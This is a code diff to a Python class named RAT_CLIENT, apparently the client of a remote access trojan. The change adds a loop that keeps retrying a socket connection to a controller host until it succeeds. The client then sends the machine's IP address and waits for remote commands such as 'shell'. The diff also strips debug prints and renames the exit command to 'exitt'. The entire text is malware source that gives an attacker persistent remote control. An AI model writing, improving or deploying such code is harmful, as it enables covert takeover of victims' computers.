@@ -41,11 +41,19 @@ class RAT_CLIENT:
         self.curdir = os.getcwd()
 
     def build_connection(self):
+        connected = False
         global s
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((self.host, self.port))
-        sending = socket.gethostbyname(socket.gethostname())
-        s.send(sending.encode())
+        while not connected:  
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((self.host, self.port))
+                sending = socket.gethostbyname(socket.gethostname())
+                s.send(sending.encode())
+                connected = True
+            except socket.error as e:
+                print("Attempting to connect...")
+                time.sleep(1)
+            
     
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
@@ -57,8 +65,6 @@ class RAT_CLIENT:
     def execute(self):
         while True:
             command = s.recv(1024).decode()
-            print("dn");
-            
             if command == 'shell':
                 a=1;
                 print (a);
@@ -76,9 +82,7 @@ class RAT_CLIENT:
                     if not output:
                         self.errorsend()
 
-                print("ddfd")
-
-            elif command == 'exit':
+            elif command == 'exitt':
                 s.send(b"exit")
                 break
 
